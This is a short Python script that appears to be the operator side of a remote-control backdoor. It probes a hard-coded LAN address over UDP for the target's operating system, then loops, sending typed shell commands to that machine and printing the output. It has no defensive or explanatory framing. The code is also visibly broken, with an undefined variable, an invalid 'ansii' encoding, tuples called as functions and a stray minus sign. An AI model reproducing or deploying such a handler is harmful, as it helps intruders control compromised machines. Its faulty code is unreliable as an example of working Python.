import os,sys,socket,time,subprocess
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
targetIP=("192.168.43.129")
#let's introduce myself
user=input("enter your handlers")
os.system('clear')#just to clear the screen like clrscr command in cmd
print("\t\t\t\t welcome",user)
print("checking target os")
wait_os="tell me your os name"
s.sendto(wait_os.encode('ansii'),target_address)
#to receive os details
oscheck=s.recvfrom(10)
print(oscheck)
if oscheck(0).decode('ansii')=='darwin' :
    print("target machine is MAC os")
    time.sleep(1)
    print("now only control or command related to MAC")
elif oscheck(0).decode('ansii')=='linux' :
    print("target machine is linux based os")
    time.sleep(1)
    print("now only control or command related to linux")
elif oscheck(0).decode('ansii')=='win32' :
    print("target machine is windows os")
    time.sleep(1)
    print("now only control or command related to windows")
while True:
    cmd =input("enter your command: ")
    #logic
    if cmd=='exit' or cmd =='logout':
        print("disconnecting to remote host...")
        exit()#closing python program
    else:
        s.sendto(cmd.encode('ansii'),target_address)
        print("Instruction sent..")
        time.sleep(1)
        print("waiting for your response..")
        output=-s.recvfrom(100)
        print(output(0),decode())
s.close()